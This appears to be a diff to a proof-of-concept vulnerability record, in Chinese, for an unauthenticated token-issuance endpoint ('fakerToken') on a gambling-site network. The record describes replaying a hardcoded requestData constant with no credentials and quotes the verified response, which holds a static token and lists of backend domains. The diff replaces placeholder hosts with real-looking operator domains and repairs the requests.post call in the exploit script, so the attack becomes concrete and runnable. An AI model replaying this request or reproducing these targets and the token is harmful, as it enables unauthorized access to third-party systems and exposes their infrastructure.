@@ -4,12 +4,12 @@
 - **kind**: poc
 - **category**: unauthorized
 - **component**: fakerToken（RB88/OB 体育站群内部 token 签发服务，Spring Boot）
-- **versions**: example.com 主包 index-10-09-17-42-CL2wXCgB.js（2026-10-09 构建）；target311.example.com 当前版本
+- **versions**: example.com 主包 index-10-09-17-42-CL2wXCgB.js（2026-10-09 构建）；uedsport.gosportsixsixsix.com 当前版本
 - **severity**: high
 - **language**: python
 - **source**: self
 - **verified**: 1
-- **verified_note**: 2026-10-10/11 在靶标 example.com（asset_id=1，203.0.113.111）上实测：POST https://example.com/ob/v2/getTryToken，body `product=rb&requestData=<704 字符常量>`，无任何 Cookie/认证头 → HTTP 200 {"code":"10000","success":true,"data":{"code":"0000","data":{"token":"8b2af1ff66e9aceb5e5b4d981ac82e1a332ed22b","userId":"528925123876225549","loginUrl":"https://target312.example.com?token=…&sessionId=52892512387622554917916586450061","apiDomain":"https://target307.example.com","apiDomainList":"https://target313.example.com,https://target314.example.com,https://target315.example.com"}}}；重复调用 token 恒定、仅 sessionId 递增（固定静态凭据）。同常量打 /fbsport/v1/getToken → 200 返回 12 组线路域名（wss://target305.example.com、https://target310.example.com、https://example.com 等，与 vuln 9 合并计 20 个域名）。反向验证：该 token 不能认证 RB88 资金后端（9 次四种注入方式全部 code 20000 未登录）；附加 userId/uid/obUserId 参数均 50040。证据：runs/fake_token_resp.json、runs/blob_full.txt，库内 vuln 13 + http_evidence 9/10 + chain seq 12/13。
+- **verified_note**: 2026-10-10/11 在靶标 example.com（asset_id=1，203.0.113.111）上实测：POST https://example.com/ob/v2/getTryToken，body `product=rb&requestData=<704 字符常量>`，无任何 Cookie/认证头 → HTTP 200 {"code":"10000","success":true,"data":{"code":"0000","data":{"token":"8b2af1ff66e9aceb5e5b4d981ac82e1a332ed22b","userId":"528925123876225549","loginUrl":"https://user-pc-new.lzy21.com?token=…&sessionId=52892512387622554917916586450061","apiDomain":"https://api.02o5mm35.com","apiDomainList":"https://api.4nrxji5w.com,https://api.iyuiydf.com,https://api.g929im6.com"}}}；重复调用 token 恒定、仅 sessionId 递增（固定静态凭据）。同常量打 /fbsport/v1/getToken → 200 返回 12 组线路域名（wss://push.9r9o.com、https://player.online909.com、https://example.com 等，与 vuln 9 合并计 20 个域名）。反向验证：该 token 不能认证 RB88 资金后端（9 次四种注入方式全部 code 20000 未登录）；附加 userId/uid/obUserId 参数均 50040。证据：runs/fake_token_resp.json、runs/blob_full.txt，库内 vuln 13 + http_evidence 9/10 + chain seq 12/13。
 - **path**: pocs/fakertoken-硬编码-requestdata-常量重放-未认证签发-ob-平台登录-token-与线路后端域名表-rb88-ob-站群通用/poc.txt
 - **tags**: fakerToken,rb88,博彩站群,未授权,token签发,硬编码常量,requestData,信息泄露
 - **created_at**: 2026-10-10T19:02:17.020Z
@@ -63,7 +63,7 @@ def post(path, data, tag):
     h = {'Host': HOST, 'User-Agent': UA, 'Accept': 'application/json, text/plain, */*',
          'Origin': 'https://example.com', 'Referer': 'https://example.com/',
          'Content-Type': 'application/x-www-form-urlencoded'}   # 必须 form，用 JSON 会 50040
-    r = target9.example.com('https://' + HOST + path, headers=h, data=data,
+    r = requests.post('https://' + HOST + path, headers=h, data=data,
                       proxies=P, verify=False, timeout=25)
     print('[%s] HTTP %s' % (tag, r.status_code))
     try:
